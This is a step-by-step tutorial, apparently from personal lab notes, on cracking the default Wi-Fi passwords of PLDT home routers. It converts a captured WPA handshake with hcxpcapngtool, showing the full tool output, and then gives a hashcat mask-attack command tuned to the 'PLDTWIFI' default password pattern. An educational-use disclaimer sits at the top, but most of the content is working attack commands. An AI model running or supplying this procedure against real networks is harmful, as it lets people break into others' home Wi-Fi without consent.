### How to Hack PLDTWIFI Default Credetials (PART2)

Author's Warning:
- This video is for EDUCATIONAL PURPOSES ONLY. I own all equipment used for this demonstration. Only use the tools demonstrated in this video against networks you have permission to attack.

Note:
- to disable monitor mode and bring the wifi adapter back to its normal operation, perform `sudo airmon-ng stop wlan0`, then use the syntax `systemctl start NetworkManager`
#### Steps

1. Check in your home directory of the file captured in the last tutorial. In our case: `test.pcapng`
   ![[Pasted image 20220823071552.png]]
2. Before we can crack this password, we will convert this first to a file recognized by hashcat. To do this, we can use the syntax `hcxpcapngtool -E essidlist -I identitylist -U usernamelist -o /home/kali/test.22000 /home/kali/test.pcapng`, like so:

```
┌──(kali㉿kali)-[~]
└─$ hcxpcapngtool -E essidlist -I identitylist -U usernamelist -o /home/kali/test.22000 /home/kali/test.pcapng
hcxpcapngtool 6.2.7-36-g5dc85e2 reading from test.pcapng...

summary capture file
--------------------
file name................................: test.pcapng
version (pcapng).........................: 1.0
operating system.........................: Linux 5.18.0-kali5-amd64
application..............................: hcxdumptool 6.2.6
interface name...........................: wlan0
interface vendor.........................: 14ebb6
openSSL version..........................: 1.0
weak candidate...........................: 12345678
MAC ACCESS POINT.........................: 1011112cbeb6 (incremented on every new client)
MAC CLIENT...............................: b025aa87c352
REPLAYCOUNT..............................: 65134
ANONCE...................................: 51a04fa9485a0fc4bc9ef7a2cc7687146476cfe354e02b804015a0cc37c90f97
SNONCE...................................: 981d9b2fb4486c9c1b2d0215fe5c4c59b4b49f183ee225e71f3838ed433edd74
timestamp minimum (GMT)..................: 23.08.2022 07:05:53
timestamp maximum (GMT)..................: 23.08.2022 07:06:28
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11_RADIO (127)
endianess (capture system)...............: little endian
packets inside...........................: 464
frames with correct FCS..................: 462
packets received on 2.4 GHz..............: 2
packets received on 5 GHz................: 460
ESSID (total unique).....................: 2
BEACON (total)...........................: 3
BEACON on 2.4 GHz channel (from IE_TAG)..: 1 
BEACON on 5/6 GHz channel (from IE-TAG)..: 149 
BEACON (SSID wildcard/unset).............: 1
AUTHENTICATION (total)...................: 2
AUTHENTICATION (OPEN SYSTEM).............: 2
ASSOCIATIONREQUEST (total)...............: 1
ASSOCIATIONREQUEST (PSK).................: 1
EAPOL messages (total)...................: 456
EAPOL RSN messages.......................: 456
EAPOLTIME gap (measured maximum usec)....: 7498
EAPOL ANONCE error corrections (NC)......: not detected
REPLAYCOUNT gap (measured maximum).......: 2
EAPOL M1 messages (total)................: 450
EAPOL M2 messages (total)................: 3
EAPOL M3 messages (total)................: 1
EAPOL M4 messages (total)................: 2
EAPOL pairs (total)......................: 3
EAPOL pairs (best).......................: 1
EAPOL pairs written to 22000 hash file...: 1 (RC checked)
EAPOL M32E2 (authorized).................: 1

frequency statistics from radiotap header (frequency: received packets)
-----------------------------------------------------------------------
 2412: 2         5300: 114       5745: 244       5765: 95
 5785: 1         5805: 6

Information: missing frames!
This dump file does not contain undirected proberequest frames.
An undirected proberequest may contain information about the PSK.
It always happens if the capture file was cleaned or
it could happen if filter options are used during capturing.
That makes it hard to recover the PSK.


session summary
---------------
processed pcapng files................: 1

                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ 

```

Use `ls` command to check and verify if the new file is now available:
![[Pasted image 20220823071839.png]]

3. Upload test.22000 in your drive (google drive, one drive, etc), or check if you can perform file sharing in your virtual machine going to your windows machine (haven't performed this yet).
4. Download the test.2200 in your windows machine (not kali), I will explain this later:
   ![[Pasted image 20220823072244.png]]
5. Download Hashcat. Use the Part1 tutorial for reference. No need to install, just download and extract.
6. Move the downloaded file (test.2200) to the hashcat directories folder, like so:
   ![[Pasted image 20220823072503.png]]
7. Open Windows Powershell, you can also use command prompt, but for me powershell gives more flexibility:
![[Pasted image 20220823084001.png]]

Once done, use this syntax:

```
./hashcat.exe -m 22000 test.22000 -a 3 -w 4 -S --force --increment --increment-min 13 --increment-max 14 -1 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 PLDTWIFI?1?1?1?1?1
```

Make sure that the file test.22000 is in the hashcat directory:

![[Pasted image 20220823084207.png]]

Once done, patiently wait for the password to crack and we can test it against the SSID:


![](../img/Pasted%20image%2020220823192222.png)
END